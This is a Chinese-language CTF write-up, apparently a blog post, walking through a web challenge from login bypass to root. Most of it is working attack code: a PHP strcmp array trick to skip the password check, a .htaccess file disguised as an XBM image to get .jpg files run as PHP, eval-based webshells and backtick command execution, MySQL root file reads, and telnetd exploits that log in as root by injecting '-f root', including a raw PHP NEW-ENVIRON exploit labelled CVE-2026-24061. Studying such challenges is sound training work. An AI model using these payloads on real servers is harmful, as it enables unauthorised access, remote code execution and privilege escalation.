            $error = "Password Wrong";
        }
    }
}
?&gt;
</code></pre>
<p>e，原来<code>THIS_IS_A_VERY_LONG_RANDOM_PASSWORD_THAT_CANNOT_BE_BRUTEFORCED_882193712</code>只是表示我们不知道这个密码，我还以为密码就是这个呢...</p>
<p><code>index.php.bak</code> 源码中，我们可以看到核心的密码验证逻辑：</p>
<pre><code>if ($u === 'admin') {
    // Dev Note: using strcmp for binary safe comparison
    if (strcmp($p, $REAL_PASSWORD) == 0) {
        $_SESSION['is_admin'] = true;
        // ...
    }
}
</code></pre>
<blockquote>
<p>漏洞点： 使用了 strcmp(REAL_PASSWORD) == 0 进行比较。 在 PHP（尤其是 5.x 和 7.x 版本）中，strcmp() 函数有一个著名的缺陷：如果比较的参数中一个是字符串，另一个是数组（Array），它会报错（Warning）并返回 NULL（在 PHP 8.0+ 之前）。</p>
<p>在 PHP 的弱类型比较（==）中，NULL == 0 是成立的（True）。</p>
</blockquote>
<p><strong>利用方法：</strong> 我们要欺骗服务器，让它认为我们输入了正确的密码。只需要将 <code>password</code> 参数改为<strong>数组</strong>形式发送即可。</p>
<p>hackbar POST</p>
<pre><code>username=admin&amp;password[]=1
</code></pre>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260314161705855.png" alt="image-20260314161705749" loading="lazy"></p>
<p>文件上传？试试</p>
<p>发现正常上传.htaccess会失败</p>
<pre><code>AddType application/x-httpd-php .jpg
</code></pre>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260314162344711.png" alt="image-20260314162344644" loading="lazy"></p>
<p>利用 XBM 图片格式制作“图片马”格式的配置文件</p>
<blockquote>
<p>Apache 配置文件：.htaccess 支持 # 作为注释符号，Apache 会忽略以 # 开头的行。 XBM 图片格式：这是一种古老的图片格式，其文件头部特征正好是用 C 语言宏定义表示的，例如 #define width 10。 结合点：我们可以构造一个文件，前两行写成 XBM 的格式（以此欺骗 PHP 的图片检测函数），第三行写 Apache 的配置指令。Apache 读取时会把前两行当注释，只执行第三行。</p>
</blockquote>
<p><strong>修改点</strong>：</p>
<pre><code>Filename: .htaccess
Content-Type: image/jpeg (或者是 image/x-xbitmap，建议先试 jpeg 欺骗 MIME 检查)
Content: 使用 #define 开头，骗过图片检测。
</code></pre>
<p>请求内容</p>
<pre><code>POST /upload.php HTTP/1.1
Host: ctf.furryctf.com:37395
Content-Length: 271
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Origin: http://ctf.furryctf.com:37395
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJwabDUs913acvajA
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://ctf.furryctf.com:37395/dashboard.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=781bad690c2774335ef9c5edf1607c0c
Connection: keep-alive

------WebKitFormBoundaryJwabDUs913acvajA
Content-Disposition: form-data; name="file"; filename=".htaccess"
Content-Type: application/octet-stream

#define width 1337
#define height 1337
AddType application/x-httpd-php .jpg
------WebKitFormBoundaryJwabDUs913acvajA--
</code></pre>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260314162433909.png" alt="image-20260314162433846" loading="lazy"></p>
<p>上传成功</p>
<blockquote>
<p>#define width 1337 和 #define height 1337 让 PHP 的 getimagesize() 认为这是一张合法的 XBM 图片。 Apache 加载这个 .htaccess 时，前两行被视为注释（因为是 # 开头），第三行 AddType... 被正常执行。</p>
</blockquote>
<p>其实后面发现，gif头加段标签就能绕过过滤，但那都是后话了</p>
<pre><code class="language-shell.jpg">GIF89a
&lt;? @eval($_POST['a']);?&gt;
</code></pre>
<p>制作一句话木马图片</p>
<blockquote>
<p>Payload 特征：</p>
<p>文件名：shell.jpg (必须是 jpg，为了配合 .htaccess 的解析规则)。 Content-Type：image/jpeg (欺骗 MIME 检查)。 文件内容：使用 #define 开头（欺骗 getimagesize 等函数认为这是 XBM 图片），紧接着放入 PHP 代码一句话木马。</p>
</blockquote>
<pre><code class="language-shell.jpg">#define width 1337 
#define height 1337
&lt;?php eval($_POST['cmd']); ?&gt;
</code></pre>
<p>可以在php代码前后加上</p><pre> </pre>可以自动换行<p></p>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260314162928023.png" alt="image-20260314162927940" loading="lazy"></p>
<p>被过滤了，尝试一些变型</p>
<p><a href="https://xz.aliyun.com/news/8745" target="_blank" rel="noopener nofollow">一句话木马免杀</a></p>
<p>都失败了</p>
<p>换成</p>
<pre><code>#define width 1337 
#define height 1337
&lt;pre&gt;
&lt;?= `ls -F /`; ?&gt;
</code></pre>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260314164140531.png" alt="image-20260314164140443" loading="lazy"></p>
<p>flag1直接cat</p>
<p>再看看start.sh</p>
<pre><code>#define&nbsp;width 1337&nbsp;#define&nbsp;height 1337
#!/bin/bash
service mariadb start
mysql -u root -e&nbsp;"CREATE DATABASE IF NOT EXISTS ctf_db;"
mysql -u root -e&nbsp;"CREATE USER IF NOT EXISTS 'ctf'@'localhost' IDENTIFIED BY 'ctf';"
mysql -u root -e&nbsp;"GRANT ALL PRIVILEGES ON ctf_db.* TO 'ctf'@'localhost';"
mysql -u root -e&nbsp;"FLUSH PRIVILEGES;"
if&nbsp;[ -f /var/www/html/db.sql ];&nbsp;then
&nbsp; &nbsp; mysql -u root ctf_db &lt; /var/www/html/db.sql
fi
if&nbsp;[ ! -z&nbsp;"$GZCTF_FLAG"&nbsp;];&nbsp;then
&nbsp; &nbsp; LEN=${#GZCTF_FLAG}
&nbsp; &nbsp; PART_LEN=$((LEN / 3))
&nbsp; &nbsp;&nbsp;
&nbsp; &nbsp; FLAG1=${GZCTF_FLAG:0:$PART_LEN}
&nbsp; &nbsp; FLAG2=${GZCTF_FLAG:$PART_LEN:$PART_LEN}
&nbsp; &nbsp; FLAG3=${GZCTF_FLAG:$((PART_LEN * 2))}
&nbsp; &nbsp;&nbsp;echo$FLAG1&nbsp;&gt; /flag1
&nbsp; &nbsp; chmod 644 /flag1
&nbsp; &nbsp;&nbsp;echo$FLAG2&nbsp;&gt; /var/www/html/.flag2_hidden
&nbsp; &nbsp; chmod 644 /var/www/html/.flag2_hidden
&nbsp; &nbsp;&nbsp;echo$FLAG3&nbsp;&gt; /root/flag3
&nbsp; &nbsp; chmod 600 /root/flag3
&nbsp; &nbsp;&nbsp;export&nbsp;GZCTF_FLAG=not_here
fi
/usr/sbin/xinetd -stayalive -pidfile /var/run/xinetd.pid
exec&nbsp;apache2-foreground
</code></pre>
<p>发现flag 被分成三份</p>
<pre><code>echo$FLAG2&nbsp;&gt; /var/www/html/.flag2_hidden
</code></pre>
<p>flag2权限644可以直接读，顺便找有root权限的程序读flag3</p>
<pre><code class="language-shell.jpg">#define&nbsp;width 1337
#define&nbsp;height 1337
&lt;pre&gt;
Type: Flag 2
&lt;?= `cat /var/www/html/.flag2_hidden`; ?&gt;

Type: SUID Files (For Flag 3)
&lt;?= `find / -perm -u=s -type&nbsp;f 2&gt;/dev/null`; ?&gt;
&lt;/pre&gt;
</code></pre>
<p>拿到flag2</p>
<p>看<strong><code>start.sh</code></strong> <strong>脚本</strong></p>
<pre><code>if [ ! -z "$GZCTF_FLAG" ]; then
    ...
    export GZCTF_FLAG=not_here
fi
</code></pre>
<blockquote>
<p>虽然脚本最后把环境变量修改成了 not_here，但在 Linux 系统中，/proc/1/environ 文件记录的是进程启动时的“原始”环境变量，后续代码中的 export 修改通常不会回写到这个文件中！</p>
<p>也就是说，原始的完整 flag 很可能还躺在 PID 1 进程的初始环境里，而且在很多 Docker 容器中，www-data 用户是有权限读取 /proc/*/environ 的。</p>
</blockquote>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260314164911272.png" alt="图片" loading="lazy"></p>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260314164910582.png" alt="图片" loading="lazy"></p>
<p>没有</p>
<p><code>/proc/1/environ</code> 空的，说明环境已经被彻底清理了</p>
<p>在看start.sh</p>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260314164956229.png" alt="图片" loading="lazy"></p>
<p>有一行命令：<code>mysql -u root -e "CREATE DATABASE ..."</code></p>
<p>mysql -u root<code>后面没有</code>-p 参 这说明：<strong>数据库的 Root 用户没有密码！</strong></p>
<p>在 CTF 和 Docker 环境中，利用数据库的高权限（FILE 权限）来读取系统文件是经典的提权手段。我们可以用 PHP 连接本地数据库，然后执行 SQL 语句 <code>SELECT LOAD_FILE('/root/flag3')</code> 直接把 flag 读出来。</p>
<p>利用 MySQL Root 读取文件</p>
<pre><code>#define&nbsp;width 1337
#define&nbsp;height 1337
&lt;pre&gt;
MySQL Root File Read:
&lt;?php
try {
&nbsp; &nbsp;&nbsp;$m&nbsp;= new mysqli("127.0.0.1",&nbsp;"root",&nbsp;"");
&nbsp; &nbsp;&nbsp;if&nbsp;($m-&gt;connect_errno) {
&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;echo"Connect failed: "&nbsp;.&nbsp;$m-&gt;connect_error;
&nbsp; &nbsp; }&nbsp;else&nbsp;{
&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;$res&nbsp;=&nbsp;$m-&gt;query("SELECT LOAD_FILE('/root/flag3')");
&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;if&nbsp;($res) {
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;$row&nbsp;=&nbsp;$res-&gt;fetch_row();
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; var_dump($row[0]);
&nbsp; &nbsp; &nbsp; &nbsp; }&nbsp;else&nbsp;{
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;echo"Query failed.";
&nbsp; &nbsp; &nbsp; &nbsp; }
&nbsp; &nbsp; }
} catch (Exception&nbsp;$e) {
&nbsp; &nbsp;&nbsp;echo$e-&gt;getMessage();
}
?&gt;
&lt;/pre&gt;
</code></pre>
<p>然后失败不行</p>
<p>原因是Exim4 在检测到你使用 <code>-C</code> 指定自定义配置文件时，出于安全考虑，主动<strong>降权</strong>到了 <code>www-data</code> (uid 33)，所以它无法读取 root 拥有的 <code>/root/flag3</code>。这意味着通过 Exim4 直接读文件这条路在当前版本（4.94.2）是被堵死的。</p>
<p>(Xinetd &amp; 进程列表看看)</p>
<blockquote>
<p>/root/flag3 的确切权限。</p>
<p>当前系统里到底在运行什么进程（ps -ef）。</p>
<p>xinetd 到底配置了什么服务（读取 /etc/xinetd.d/*）。</p>
<p>查看开放的端口（cat /proc/net/tcp）</p>
</blockquote>
<pre><code>&lt;pre&gt;
[File Permissions]
&lt;?= `ls -l /root/flag3`; ?&gt;

[Process List]
&lt;?= `ps -ef`; ?&gt;

[Xinetd Configs]
&lt;?= `grep -r . /etc/xinetd.d/`; ?&gt;

[Listening Ports]
&lt;?= `cat /proc/net/tcp`; ?&gt;
&lt;/pre&gt;
</code></pre>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260314165326806.png" alt="image-20260314165326698" loading="lazy"></p>
<p>在配置服务中找到线索，其他服务都是disable</p>
<p>只有telnet开放</p>
<pre><code>/etc/xinetd.d/telnet:service telnet
/etc/xinetd.d/telnet:{
/etc/xinetd.d/telnet:    disable         = no
/etc/xinetd.d/telnet:    flags           = REUSE
/etc/xinetd.d/telnet:    socket_type     = stream
/etc/xinetd.d/telnet:    wait            = no
/etc/xinetd.d/telnet:    user            = root
/etc/xinetd.d/telnet:    server          = /usr/local/libexec/telnetd
/etc/xinetd.d/telnet:    server_args     = --debug
/etc/xinetd.d/telnet:    log_on_failure  += USERID
/etc/xinetd.d/telnet:    bind            = 0.0.0.0
/etc/xinetd.d/telnet:    type            = UNLISTED
/etc/xinetd.d/telnet:    port            = 23
/etc/xinetd.d/telnet:}
</code></pre>
<p>root权限，23端口，/usr/local/libexec/telnetd</p>
<p>豆包告诉我</p>
<pre><code>1. 系统自带的软件
都在这些目录里：
    /sbin/
    /usr/sbin/
    /usr/bin/

2. 手动 / 自定义 / 编译安装的软件
都在这些目录里：
    /usr/local/ ✅
    /usr/local/bin/
    /usr/local/libexec/ ✅
    /opt/...
</code></pre>
<p>回想题目描述中说的陈旧服务可能就是这个吧</p>
<h3 id="法一-1">法一：</h3>
<p>旧版本可能存在“环境变量注入漏洞” (CVE-2011-4862)</p>
<p><strong>Telnet 参数注入</strong></p>
<blockquote>
<p>原理：telnet 客户端的 -l 参数用于指定登录用户名。在客户端与服务端交互时，这个用户名会通过 USER 环境变量传递给服务端。</p>
<p>漏洞点：服务端 telnetd 接收到用户名后，如果未经过滤直接拼接到 /bin/login 的参数中，就会造成参数注入。</p>
<p>Payload：我们使用用户名 "-f root"。 命令解析过程大致为：/bin/login -p -h-f root</p>
<p>-f 参数：对于 login 程序，-f 表示 “Pre-authenticated”（已验证），即告诉系统用户已经通过了验证，不需要再输入密码。</p>
<p>root：指定登录的用户为 root。</p>
</blockquote>
<p>最终 Exploit</p>
<p>构造如下命令，利用管道将后续的操作（查看 flag）自动发送给 telnet 会话：</p>
<pre><code>(sleep 1; echo "id"; echo "cat /root/flag3"; sleep 1) | telnet -l "-f root" 127.0.0.1 23
</code></pre>
<pre><code>#define&nbsp;width 1337
#define&nbsp;height 1337
&lt;pre&gt;
&lt;?= `(sleep 1; echo "id"; echo "cat /root/flag3"; sleep 1) | telnet -l "-f root" 127.0.0.1 23`; ?&gt;
&lt;/pre&gt;
</code></pre>
<p>一直加载却不输出，奇怪</p>
<p>蚁剑试试</p>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260314173853039.png" alt="image-20260314173852910" loading="lazy"></p>
<p>wk怎么有不可见字符？</p>
<pre><code class="language-php">&lt;?php
$str = "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
echo "ASCII码：";
for($i=0;$i&lt;strlen($str);$i++){
    echo ord($str[$i]) . " ";
}
?&gt;
#输出194 160
</code></pre>
<p>我靠居然是全角空格，赶紧换掉</p>
<p>咦怎么还不行</p>
<p>我靠这个echo后怎么没空格？</p>
<p>最终payload</p>
<pre><code>#define&nbsp;width 1337
#define&nbsp;height 1337
&lt;pre&gt;
&lt;?= `(sleep 1; echo "id"; echo "cat /root/flag3"; sleep 1) | telnet -l "-f root" 127.0.0.1 23`; ?&gt;
&lt;/pre&gt;
</code></pre>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260314174241502.png" alt="image-20260314174241404" loading="lazy"></p>
<p>拿到flag3</p>
<h3 id="法二cve-2026-24061">法二：CVE-2026-24061</h3>
<p>蚁剑写进shell.php</p>
<pre><code class="language-php">&lt;?php
$s = fsockopen("127.0.0.1", 23);
if(!$s) die();
stream_set_blocking($s, 1);
stream_set_timeout($s, 2);
$p = "\xff\xfa\x27\x00\x00USER\x01-f root\xff\xf0";
while(!feof($s)) {
    $c = fgetc($s);
    if($c === false) break;
    if($c == "\xff") {
        $o = fgetc($s);
        if($o == "\xfd") {
            $t = fgetc($s);
            if($t == "\x27") fwrite($s, "\xff\xfb\x27");
            else fwrite($s, "\xff\xfc".$t);
        } elseif($o == "\xfa") {
            if(fgetc($s) == "\x27") {
                while(fgetc($s) != "\xf0");
                fwrite($s, $p);
                sleep(1);
                fwrite($s, "cat /root/flag3\n");
            }
        } elseif($o == "\xfe" || $o == "\xfb" || $o == "\xfc") {
            fgetc($s);
        }
    } else {
        echo $c;
    }
}
fclose($s);
?&gt;
</code></pre>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260314172601967.png" alt="image-20260314172601831" loading="lazy"></p>
<p>拿到flag3</p>
